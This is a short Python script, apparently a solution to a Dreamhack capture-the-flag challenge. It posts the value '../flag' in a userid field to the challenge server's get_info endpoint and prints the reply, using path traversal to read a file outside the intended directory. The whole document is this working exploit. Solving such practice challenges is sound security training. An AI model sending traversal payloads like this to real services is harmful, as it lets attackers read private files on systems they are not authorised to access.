import requests

port = 24405
url_index = f"http://host3.dreamhack.games:{port}/"
url_info = url_index + "get_info"

param = {"userid": "../flag"}

r = requests.post(url_info, data=param)
print(r.text)
